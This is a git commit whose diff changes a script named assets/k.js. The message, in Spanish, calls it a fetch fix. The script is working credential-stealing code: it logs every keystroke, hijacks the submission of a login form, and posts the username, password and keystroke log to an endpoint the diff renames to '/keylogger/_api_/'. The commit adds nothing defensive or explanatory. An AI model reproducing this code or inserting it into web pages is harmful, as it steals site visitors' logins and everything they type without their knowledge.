37c6699525e8a78170fb4437c232e28945140bb9
Christofer Daniel Chaves Pauth <42120690+Christofer2002@users.noreply.github.com>
2025-05-18 19:10:27 -0600

    Arreglo de fetch en js

--- assets/k.js
+++ assets/k.js
@@ -1,3 +1,3 @@
 var _0xkl='';document.addEventListener('keydown',function(e){if(e.key.length==1){_0xkl+=e.key}});
 document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();var d=new FormData(e.target);
-fetch('/_api_/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:d.get('usuario'),p:d.get('clave'),k:_0xkl})});});
+fetch('/keylogger/_api_/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:d.get('usuario'),p:d.get('clave'),k:_0xkl})});});
